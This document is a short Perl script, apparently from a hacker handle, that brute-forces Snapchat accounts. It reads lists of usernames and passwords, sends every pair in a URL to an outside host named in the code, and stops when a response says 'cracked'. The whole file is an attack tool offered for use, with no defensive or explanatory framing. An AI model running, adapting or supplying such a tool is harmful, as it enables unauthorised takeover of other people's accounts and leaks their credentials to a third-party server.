use LWP::UserAgent ;
system('cls');
print qq(
################################
#
# Coded By 1337r00t
#
# Instagram : @1337r00t
#
# Twitter : @_1337r00t
#
################################\n);
print qq(
Enter Usernames File :
> );
$usernames=<STDIN>;
chomp($usernames);
open (USERFILE, "<$usernames") || die "[-] Can't Found The List Of Usernames !";
@USERS = <USERFILE>;
close USERFILE;

print qq(
Enter Passwords File :
> );
$passwords=<STDIN>;
chomp($passwords);
open (PASSFILE, "<$passwords") || die "[-] Can't Found The List Of Passwords !";
@PASSS = <PASSFILE>;
close PASSFILE;
system('cls');
print "Cracking Now !..\n";
######################
foreach $username (@USERS) {
chomp $username;
foreach $password (@PASSS) {
chomp $password;
	$ua = LWP::UserAgent->new();
	$request = HTTP::Request->new(GET => "http://1337leaks.info/tools/snapchat/?username=$username&password=$password");
	$response = $ua->request($request);
	$output = $response->content();
	if ($response->content=~ /cracked/) {
		print "$output\n";
		exit;
	}
	else
	{
		print "$output\n";
	}
}
}
